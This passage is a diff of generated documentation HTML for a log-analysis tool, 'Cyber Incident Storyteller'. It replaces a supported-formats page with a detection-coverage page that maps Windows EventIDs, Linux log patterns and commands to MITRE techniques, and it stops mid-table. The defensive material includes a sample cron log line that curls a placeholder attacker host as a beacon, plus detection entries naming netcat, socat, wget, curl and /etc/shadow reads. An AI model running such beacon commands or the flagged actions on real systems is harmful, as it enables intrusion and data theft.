@@ -10,13 +10,13 @@
       
       
       
-        <link rel="canonical" href="https://lironabraham.github.io/cyber-incident-storyteller/supported-formats/">
+        <link rel="canonical" href="https://lironabraham.github.io/cyber-incident-storyteller/detection-coverage/">
       
       
-        <link rel="prev" href="../cli-reference/">
+        <link rel="prev" href="../supported-formats/">
       
       
-        <link rel="next" href="../detection-coverage/">
+        <link rel="next" href="../sample-report/">
       
       
         
@@ -27,7 +27,7 @@
     
     
       
-        <title>Supported Formats - Cyber Incident Storyteller</title>
+        <title>Detection Coverage - Cyber Incident Storyteller</title>
       
     
     
@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#supported-log-formats" class="md-skip">
+        <a href="#detection-coverage" class="md-skip">
           Skip to content
         </a>
       
@@ -116,7 +116,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Supported Formats
+              Detection Coverage
             
           </span>
         </div>
@@ -340,6 +340,33 @@
       
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../supported-formats/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Supported Formats
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
     
   
   
@@ -359,7 +386,7 @@
   <span class="md-ellipsis">
     
   
-    Supported Formats
+    Detection Coverage
   
 
     
@@ -377,7 +404,7 @@
   <span class="md-ellipsis">
     
   
-    Supported Formats
+    Detection Coverage
   
 
     
@@ -403,10 +430,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#auth_log-varlogauthlog" class="md-nav__link">
+  <a href="#windows-eventids-evtx-parser" class="md-nav__link">
     <span class="md-ellipsis">
       
-        auth_log — /var/log/auth.log
+        Windows EventIDs (EVTX parser)
       
     </span>
   </a>
@@ -414,10 +441,187 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#syslog-varlogsyslog" class="md-nav__link">
+  <a href="#linux-event-types" class="md-nav__link">
     <span class="md-ellipsis">
       
-        syslog — /var/log/syslog
+        Linux Event Types
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Linux Event Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#authlog" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        auth.log
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#syslog" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        syslog
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#auditlog" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        audit.log
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web_access-nginx-apache" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        web_access (nginx / Apache)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sysmon_linux-microsoft-sysmon-for-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        sysmon_linux (Microsoft Sysmon for Linux)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-level-mitre-mapping-53-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command-Level MITRE Mapping (53 commands)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Command-Level MITRE Mapping (53 commands)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ingress-c2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ingress / C2
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Execution
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-evasion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense Evasion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lateral-movement-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Movement / Exfiltration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#archive-staging" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Archive / Staging
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Persistence
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Access
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-chain-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain Types
       
     </span>
   </a>
@@ -425,54 +629,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#audit_log-varlogauditauditlog" class="md-nav__link">
+  <a href="#detection-pathways" class="md-nav__link">
     <span class="md-ellipsis">
       
-        audit_log — /var/log/audit/audit.log
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#web_access-varlognginxaccesslog" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        web_access — /var/log/nginx/access.log
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sysmon_linux-linux-sysmon-xml" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        sysmon_linux — Linux Sysmon XML
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#evtx-windows-event-log" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        evtx — Windows Event Log
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#combining-formats" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Combining formats
+        Detection Pathways
       
     </span>
   </a>
@@ -483,33 +643,6 @@
   
 </nav>
       
-    </li>
-  
-
-    
-      
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../detection-coverage/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Detection Coverage
-  
-
-    
-  </span>
-  
-  
-
-      </a>
     </li>
   
 
@@ -649,10 +782,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#auth_log-varlogauthlog" class="md-nav__link">
+  <a href="#windows-eventids-evtx-parser" class="md-nav__link">
     <span class="md-ellipsis">
       
-        auth_log — /var/log/auth.log
+        Windows EventIDs (EVTX parser)
       
     </span>
   </a>
@@ -660,10 +793,187 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#syslog-varlogsyslog" class="md-nav__link">
+  <a href="#linux-event-types" class="md-nav__link">
     <span class="md-ellipsis">
       
-        syslog — /var/log/syslog
+        Linux Event Types
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Linux Event Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#authlog" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        auth.log
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#syslog" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        syslog
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#auditlog" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        audit.log
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web_access-nginx-apache" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        web_access (nginx / Apache)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sysmon_linux-microsoft-sysmon-for-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        sysmon_linux (Microsoft Sysmon for Linux)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-level-mitre-mapping-53-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command-Level MITRE Mapping (53 commands)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Command-Level MITRE Mapping (53 commands)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ingress-c2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ingress / C2
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Execution
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-evasion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense Evasion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lateral-movement-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Movement / Exfiltration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#archive-staging" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Archive / Staging
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Persistence
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Access
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-chain-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain Types
       
     </span>
   </a>
@@ -671,54 +981,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#audit_log-varlogauditauditlog" class="md-nav__link">
+  <a href="#detection-pathways" class="md-nav__link">
     <span class="md-ellipsis">
       
-        audit_log — /var/log/audit/audit.log
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#web_access-varlognginxaccesslog" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        web_access — /var/log/nginx/access.log
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sysmon_linux-linux-sysmon-xml" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        sysmon_linux — Linux Sysmon XML
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#evtx-windows-event-log" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        evtx — Windows Event Log
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#combining-formats" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Combining formats
+        Detection Pathways
       
     </span>
   </a>
@@ -745,281 +1011,732 @@
   
 
 
-<h1 id="supported-log-formats">Supported Log Formats</h1>
-<p>Pass the format key via <code>--fmt</code> when running <code>ais analyze</code>.</p>
+<h1 id="detection-coverage">Detection Coverage</h1>
+<p>Every event type, Windows EventID, MITRE technique, and detection pathway the tool currently supports.</p>
 <hr />
-<h2 id="auth_log-varlogauthlog"><code>auth_log</code> — <code>/var/log/auth.log</code></h2>
-<p>The primary SSH and PAM authentication log on Debian/Ubuntu systems.</p>
-<p><strong>Covers:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Event type</th>
-<th>Example</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Failed Login</td>
-<td><code>Failed password for root from 1.2.3.4 port 22</code></td>
-</tr>
-<tr>
-<td>Invalid User</td>
-<td><code>Invalid user hacker from 1.2.3.4 port 22</code></td>
-</tr>
-<tr>
-<td>Accepted Password</td>
-<td><code>Accepted password for admin from 1.2.3.4 port 22</code></td>
-</tr>
-<tr>
-<td>Accepted Publickey</td>
-<td><code>Accepted publickey for deploy from 1.2.3.4</code></td>
-</tr>
-<tr>
-<td>Session Opened/Closed</td>
-<td><code>pam_unix(sshd:session): session opened for user admin</code></td>
-</tr>
-<tr>
-<td>Sudo Command</td>
-<td><code>sudo: admin : COMMAND=/bin/bash</code></td>
-</tr>
-<tr>
-<td>Auth Failure</td>
-<td><code>pam_unix(sshd:auth): authentication failure</code></td>
-</tr>
-</tbody>
-</table>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ais<span class="w"> </span>analyze<span class="w"> </span>/var/log/auth.log<span class="w"> </span>--fmt<span class="w"> </span>auth_log
-</code></pre></div>
-<hr />
-<h2 id="syslog-varlogsyslog"><code>syslog</code> — <code>/var/log/syslog</code></h2>
-<p>General system event log. Useful for detecting defense evasion (service stops) and persistence (cron, systemd).</p>
-<p><strong>Covers:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Event type</th>
-<th>Example</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Service Started/Stopped/Failed</td>
-<td><code>systemd: Started/Stopped OpenSSH Server</code></td>
-</tr>
-<tr>
-<td>Cron Execution</td>
-<td><code>CRON: (root) CMD (curl http://attacker.com/beacon)</code></td>
-</tr>
-<tr>
-<td>OOM Kill</td>
-<td><code>kernel: Out of memory: Kill process</code></td>
-</tr>
-<tr>
-<td>USB Connected</td>
-<td><code>kernel: usb 1-1: new USB device found</code></td>
-</tr>
-</tbody>
-</table>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ais<span class="w"> </span>analyze<span class="w"> </span>/var/log/syslog<span class="w"> </span>--fmt<span class="w"> </span>syslog
-</code></pre></div>
-<hr />
-<h2 id="audit_log-varlogauditauditlog"><code>audit_log</code> — <code>/var/log/audit/audit.log</code></h2>
-<p>Linux audit daemon log. High-fidelity process execution and credential access telemetry.</p>
-<p><strong>Covers:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Event type</th>
-<th>Example</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Process Execution</td>
-<td><code>type=EXECVE a0="wget" a1="http://..."</code></td>
-</tr>
-<tr>
-<td>Shell Execution</td>
-<td><code>type=SYSCALL comm="bash"</code></td>
-</tr>
-<tr>
-<td>File Access</td>
-<td><code>type=OPEN name="/etc/shadow"</code></td>
-</tr>
-<tr>
-<td>Audit Auth Failure</td>
-<td><code>type=USER_AUTH res=failed</code></td>
-</tr>
-<tr>
-<td>Audit Login</td>
-<td><code>type=USER_LOGIN res=success</code></td>
-</tr>
-</tbody>
-</table>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ais<span class="w"> </span>analyze<span class="w"> </span>/var/log/audit/audit.log<span class="w"> </span>--fmt<span class="w"> </span>audit_log
-</code></pre></div>
-<hr />
-<h2 id="web_access-varlognginxaccesslog"><code>web_access</code> — <code>/var/log/nginx/access.log</code></h2>
-<p>Nginx (and compatible Apache) access logs. Detects web attacks, scanning, and web shells.</p>
-<p><strong>Covers:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Event type</th>
-<th>Detection logic</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Web Shell</td>
-<td>POST to <code>.php</code>/<code>.asp</code>/<code>.jsp</code> returning <code>200</code></td>
-</tr>
-<tr>
-<td>Web Attack</td>
-<td>SQLi/XSS/traversal patterns in URI</td>
-</tr>
-<tr>
-<td>Web Scan</td>
-<td>Rapid sequential 404s across paths</td>
-</tr>
-<tr>
-<td>Tool Fingerprint</td>
-<td><code>sqlmap</code>, <code>nikto</code>, <code>masscan</code> in User-Agent</td>
-</tr>
-<tr>
-<td>Admin Access</td>
-<td>Requests to <code>/admin</code>, <code>/wp-admin</code>, <code>/.env</code></td>
-</tr>
-</tbody>
-</table>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ais<span class="w"> </span>analyze<span class="w"> </span>/var/log/nginx/access.log<span class="w"> </span>--fmt<span class="w"> </span>web_access
-</code></pre></div>
-<hr />
-<h2 id="sysmon_linux-linux-sysmon-xml"><code>sysmon_linux</code> — Linux Sysmon XML</h2>
-<p>Microsoft Sysmon for Linux output (one <code>&lt;Event&gt;</code> block per line). High-fidelity endpoint telemetry.</p>
-<p><strong>Covers:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Sysmon EventID</th>
-<th>Event type</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>Process Created</td>
-</tr>
-<tr>
-<td>3</td>
-<td>Network Connection</td>
-</tr>
-<tr>
-<td>11</td>
-<td>File Created</td>
-</tr>
-<tr>
-<td>23</td>
-<td>File Deleted</td>
-</tr>
-<tr>
-<td>5</td>
-<td>Process Terminated <em>(skipped — noise)</em></td>
-</tr>
-</tbody>
-</table>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ais<span class="w"> </span>analyze<span class="w"> </span>/var/log/sysmon.xml<span class="w"> </span>--fmt<span class="w"> </span>sysmon_linux
-</code></pre></div>
-<hr />
-<h2 id="evtx-windows-event-log"><code>evtx</code> — Windows Event Log</h2>
-<p>Windows Security and System Event Log in either binary <code>.evtx</code> format or <code>wevtutil</code> XML export.</p>
-<p><strong>Requires <code>python-evtx</code> for binary <code>.evtx</code> files:</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>pip<span class="w"> </span>install<span class="w"> </span>python-evtx
-</code></pre></div>
-<p>XML exports from <code>wevtutil qe</code> work without the extra dependency.</p>
-<p><strong>Covered EventIDs:</strong></p>
+<h2 id="windows-eventids-evtx-parser">Windows EventIDs (EVTX parser)</h2>
 <table>
 <thead>
 <tr>
 <th>EventID</th>
 <th>Channel</th>
-<th>Detects</th>
+<th>Event Type</th>
+<th>MITRE Technique</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>4624</td>
 <td>Security</td>
-<td>Logon success (interactive, remote, batch)</td>
+<td>Windows Logon Success (type 3/10 → Remote Logon)</td>
+<td>T1078 / T1021</td>
 </tr>
 <tr>
 <td>4625</td>
 <td>Security</td>
-<td>Logon failure — password brute force</td>
+<td>Windows Logon Failure</td>
+<td>T1110.001</td>
 </tr>
 <tr>
 <td>4648</td>
 <td>Security</td>
-<td>Explicit credential use — pass-the-hash indicator</td>
+<td>Windows Explicit Credential Use</td>
+<td>T1550.002</td>
 </tr>
 <tr>
 <td>4672</td>
 <td>Security</td>
-<td>Special privileges assigned</td>
+<td>Windows Privilege Assigned</td>
+<td>T1078.002</td>
 </tr>
 <tr>
 <td>4688</td>
 <td>Security</td>
-<td>Process creation — mapped to MITRE per command</td>
+<td>Windows Process Creation</td>
+<td>mapped per command</td>
 </tr>
 <tr>
-<td>4697 / 7045</td>
-<td>Security / System</td>
-<td>Service installed — lateral movement / persistence</td>
-</tr>
-<tr>
-<td>4698 / 4699 / 4702</td>
+<td>4697</td>
 <td>Security</td>
-<td>Scheduled task created / deleted / modified</td>
+<td>Windows Service Installed</td>
+<td>T1543.003</td>
+</tr>
+<tr>
+<td>4698</td>
+<td>Security</td>
+<td>Windows Scheduled Task (created)</td>
+<td>T1053.005</td>
+</tr>
+<tr>
+<td>4699</td>
+<td>Security</td>
+<td>Windows Scheduled Task (deleted)</td>
+<td>T1053.005</td>
+</tr>
+<tr>
+<td>4702</td>
+<td>Security</td>
+<td>Windows Scheduled Task (modified)</td>
+<td>T1053.005</td>
 </tr>
 <tr>
 <td>4720</td>
 <td>Security</td>
-<td>Local account created</td>
+<td>Windows Account Created</td>
+<td>T1136.001</td>
 </tr>
 <tr>
-<td>4728 / 4732</td>
+<td>4728</td>
 <td>Security</td>
-<td>Member added to global / local group</td>
+<td>Windows Group Member Added (global)</td>
+<td>T1098</td>
 </tr>
 <tr>
-<td>4768 / 4769</td>
+<td>4732</td>
 <td>Security</td>
-<td>Kerberos TGT / service ticket request</td>
+<td>Windows Group Member Added (local)</td>
+<td>T1098</td>
+</tr>
+<tr>
+<td>4768</td>
+<td>Security</td>
+<td>Windows Kerberos TGT Request</td>
+<td>T1558</td>
+</tr>
+<tr>
+<td>4769</td>
+<td>Security</td>
+<td>Windows Kerberos Service Ticket</td>
+<td>T1558.003</td>
 </tr>
 <tr>
 <td>4771</td>
 <td>Security</td>
-<td>Kerberos pre-authentication failure — spray indicator</td>
+<td>Windows Kerberos PreAuth Failure</td>
+<td>T1110</td>
 </tr>
 <tr>
 <td>5145</td>
 <td>Security</td>
-<td>Network share access</td>
+<td>Windows Share Access</td>
+<td>T1021.002</td>
+</tr>
+<tr>
+<td>7045</td>
+<td>System</td>
+<td>Windows Service Installed</td>
+<td>T1543.003</td>
+</tr>
+<tr>
+<td>4689</td>
+<td>Security</td>
+<td>Process Terminated</td>
+<td><em>(skipped — noise)</em></td>
 </tr>
 </tbody>
 </table>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Binary .evtx (requires python-evtx)</span>
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>ais<span class="w"> </span>analyze<span class="w"> </span>logs/security.evtx<span class="w"> </span>--fmt<span class="w"> </span>evtx
-<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
-<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># wevtutil XML export (no extra dependency)</span>
-<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>wevtutil<span class="w"> </span>qe<span class="w"> </span>Security<span class="w"> </span>/f:XML<span class="w"> </span>&gt;<span class="w"> </span>security.xml
-<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>ais<span class="w"> </span>analyze<span class="w"> </span>security.xml<span class="w"> </span>--fmt<span class="w"> </span>evtx
-</code></pre></div>
 <hr />
-<h2 id="combining-formats">Combining formats</h2>
-<p>Run <code>ais analyze</code> once per log file, then correlate across the generated reports. Multi-source correlation into a single campaign view is on the <a href="../roadmap/">Phase 4 roadmap</a>.</p>
+<h2 id="linux-event-types">Linux Event Types</h2>
+<h3 id="authlog">auth.log</h3>
+<table>
+<thead>
+<tr>
+<th>Event Type</th>
+<th>Source pattern</th>
+<th>MITRE Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Failed Login</td>
+<td><code>Failed password for ...</code></td>
+<td>T1110 Brute Force</td>
+</tr>
+<tr>
+<td>Invalid User</td>
+<td><code>Invalid user ... from</code></td>
+<td>T1110.001 Password Guessing</td>
+</tr>
+<tr>
+<td>Auth Failure</td>
+<td><code>pam_unix(...): authentication failure</code></td>
+<td>T1110 Brute Force</td>
+</tr>
+<tr>
+<td>Accepted Password</td>
+<td><code>Accepted password for ...</code></td>
+<td>T1078 Valid Accounts</td>
+</tr>
+<tr>
+<td>Accepted Publickey</td>
+<td><code>Accepted publickey for ...</code></td>
+<td>T1078 Valid Accounts</td>
+</tr>
+<tr>
+<td>Session Opened</td>
+<td><code>session opened for user ...</code></td>
+<td>T1021.004 SSH</td>
+</tr>
+<tr>
+<td>Sudo Command</td>
+<td><code>sudo: ... COMMAND=...</code></td>
+<td>T1548.003 Sudo</td>
+</tr>
+</tbody>
+</table>
+<h3 id="syslog">syslog</h3>
+<table>
+<thead>
+<tr>
+<th>Event Type</th>
+<th>Source pattern</th>
+<th>MITRE Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Service Started</td>
+<td><code>systemd: Started ...</code></td>
+<td>T1543.002 Systemd Service</td>
+</tr>
+<tr>
+<td>Service Stopped</td>
+<td><code>systemd: Stopped ...</code></td>
+<td>T1489 Service Stop</td>
+</tr>
+<tr>
+<td>Service Failed</td>
+<td><code>systemd: Failed ...</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td>Cron Execution</td>
+<td><code>CRON: ... CMD (...)</code></td>
+<td>T1053.003 Cron</td>
+</tr>
+<tr>
+<td>OOM Kill</td>
+<td><code>kernel: Out of memory: Kill process</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td>USB Connected</td>
+<td><code>kernel: usb ...: new USB device found</code></td>
+<td>T1025 Removable Media</td>
+</tr>
+</tbody>
+</table>
+<h3 id="auditlog">audit.log</h3>
+<table>
+<thead>
+<tr>
+<th>Event Type</th>
+<th>Source pattern</th>
+<th>MITRE Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Process Execution</td>
+<td><code>type=EXECVE a0="..."</code></td>
+<td>mapped per command</td>
+</tr>
+<tr>
+<td>Shell Execution</td>
+<td><code>type=SYSCALL comm="bash/sh"</code></td>
+<td>T1059.004 Unix Shell</td>
+</tr>
+<tr>
+<td>File Access</td>
+<td><code>type=OPEN name="/etc/shadow"</code></td>
+<td>T1003.008 /etc/shadow</td>
+</tr>
+<tr>
+<td>Audit Login</td>
+<td><code>type=USER_LOGIN res=success</code></td>
+<td>T1078 Valid Accounts</td>
+</tr>
+<tr>
+<td>Audit Auth Failure</td>
+<td><code>type=USER_AUTH res=failed</code></td>
+<td>T1110 Brute Force</td>
+</tr>
+</tbody>
+</table>
+<h3 id="web_access-nginx-apache">web_access (nginx / Apache)</h3>
+<table>
+<thead>
+<tr>
+<th>Event Type</th>
+<th>Detection logic</th>
+<th>MITRE Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Web Shell</td>
+<td>POST to <code>.php</code>/<code>.asp</code>/<code>.jsp</code> returning 200</td>
+<td>T1505.003 Web Shell</td>
+</tr>
+<tr>
+<td>Web Attack</td>
+<td>SQLi/XSS/traversal patterns in URI</td>
+<td>T1190 Exploit Public-Facing</td>
+</tr>
+<tr>
+<td>Web Scan</td>
+<td>Rapid sequential 404s from one IP</td>
+<td>T1595 Active Scanning</td>
+</tr>
+<tr>
+<td>Tool Fingerprint</td>
+<td><code>sqlmap</code>/<code>nikto</code>/<code>masscan</code> in User-Agent</td>
+<td>T1595.002 Vulnerability Scan</td>
+</tr>
+<tr>
+<td>Admin Access</td>
+<td>Requests to <code>/admin</code>, <code>/wp-admin</code>, <code>/.env</code></td>
+<td>T1078 Valid Accounts</td>
+</tr>
+</tbody>
+</table>
+<h3 id="sysmon_linux-microsoft-sysmon-for-linux">sysmon_linux (Microsoft Sysmon for Linux)</h3>
+<table>
+<thead>
+<tr>
+<th>Sysmon EventID</th>
+<th>Event Type</th>
+<th>MITRE Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Process Created</td>
+<td>mapped per command</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Network Connection</td>
+<td>T1071 Application Layer Protocol</td>
+</tr>
+<tr>
+<td>11</td>
+<td>File Created</td>
+<td>—</td>
+</tr>
+<tr>
+<td>23</td>
+<td>File Deleted</td>
+<td>T1070.004 File Deletion</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Process Terminated</td>
+<td><em>(skipped — noise)</em></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="command-level-mitre-mapping-53-commands">Command-Level MITRE Mapping (53 commands)</h2>
+<p><code>map_command()</code> strips path prefixes and <code>.exe</code>/<code>.com</code> extensions before lookup — works on both
+Unix (<code>/usr/bin/wget</code>) and Windows (<code>C:\Windows\System32\cmd.exe</code>) process paths.</p>
+<h3 id="ingress-c2">Ingress / C2</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Technique</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>wget</code>, <code>curl</code></td>
+<td>T1105</td>
+<td>Ingress Tool Transfer</td>
+</tr>
+<tr>
+<td><code>socat</code></td>
+<td>T1071</td>
+<td>Application Layer Protocol</td>
+</tr>
+</tbody>
+</table>
+<h3 id="execution">Execution</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Technique</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>nc</code>, <code>ncat</code>, <code>netcat</code></td>
+<td>T1059</td>
+<td>Command and Script Interpreter</td>
+</tr>
+<tr>
+<td><code>python</code>, <code>python3</code></td>
+<td>T1059.006</td>
+<td>Python</td>
+</tr>
+<tr>
+<td><code>perl</code>, <code>ruby</code>, <code>php</code></td>
+<td>T1059</td>
+<td>Command and Script Interpreter</td>
+</tr>
+<tr>
+<td><code>bash</code>, <code>sh</code></td>
+<td>T1059.004</td>
+<td>Unix Shell</td>
+</tr>
+<tr>
+<td><code>powershell</code>, <code>pwsh</code></td>
+<td>T1059.001</td>
+<td>PowerShell</td>
+</tr>
+<tr>
+<td><code>cmd</code></td>
+<td>T1059.003</td>
+<td>Windows Command Shell</td>
+</tr>
+<tr>
+<td><code>wscript</code>, <code>cscript</code></td>
+<td>T1059.005</td>
+<td>Visual Basic</td>
+</tr>
+<tr>
+<td><code>mshta</code></td>
+<td>T1218.005</td>
